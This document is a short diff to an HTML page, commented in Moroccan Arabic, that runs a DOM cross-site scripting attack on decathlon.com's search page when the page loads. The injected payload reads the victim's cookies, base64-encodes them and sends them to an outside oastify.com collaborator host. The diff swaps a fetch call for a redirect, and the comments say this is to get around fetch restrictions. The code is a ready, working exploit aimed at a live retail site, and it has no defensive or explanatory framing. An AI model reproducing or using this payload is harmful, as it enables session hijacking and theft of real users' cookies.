@@ -1,19 +1,16 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Checking Security...</title>
-</head>
-<body onload="autoAttack()">
+<body onload="finalStrike()">
     <script>
-        function autoAttack() {
-            // هادا هو الكود اللي كنتي باغي تكتبو فـ الكونسول
-            var myCode = "fetch('http://q4vb1kb3jykatbfeopgeel0dy44vszgo.oastify.com//?exfil=' + btoa(document.cookie), {mode:'no-cors'}); alert('Testing Collaborator - Data Sent!');";
+        function finalStrike() {
+            // الكود اللي غايجمع الكوكيز ويصيفطهم بـ Redirect
+            // استعملنا window.location باش نهربو من قيود الـ fetch
+            var payload = "window.location.href='https://bq5fhfaet10n0yflkr53beqvbmhd58tx.oastify.com/?exfil=' + btoa(document.cookie);";
 
-            // هادا هو الرابط ديال Decathlon اللي فيه الثغرة (DOM XSS)
-            // غادي نحقنو فيه الكود ديالك
-            var targetUrl = "https://www.decathlon.com/search?q=test#<svg/onload=\"" + myCode + "\">";
+            // الرابط ديال DOM XSS اللي خدم ليك فـ dkt
+            var targetUrl = "https://www.decathlon.com/search?q=test#<svg/onload=\"" + payload + "\">";
 
-            // التوجيه التلقائي
+            // طلق القرطاسة
             window.location.href = targetUrl;
         }
     </script>
